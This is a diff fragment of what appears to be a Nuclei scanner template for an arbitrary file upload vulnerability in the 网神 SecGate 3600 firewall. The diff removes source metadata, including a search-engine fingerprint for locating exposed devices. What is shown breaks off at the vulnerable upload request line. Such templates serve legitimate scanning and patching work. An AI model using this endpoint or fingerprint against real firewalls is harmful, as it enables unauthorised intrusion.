@@ -3,14 +3,8 @@ info:
   name: 网神SecGata3600防火墙sys_hand_upfile任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/efec2ca0cd953256f5f8a5d3cf39390f
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: efec2ca0cd953256f5f8a5d3cf39390f
-    fofa: + hunter:`app.name="网神 SecGate"&&web.title=="网神SecGate 3600防火墙"`
 http:
 - raw:
   - 'POST /?g=sys_hand_upfile HTTP/1.1
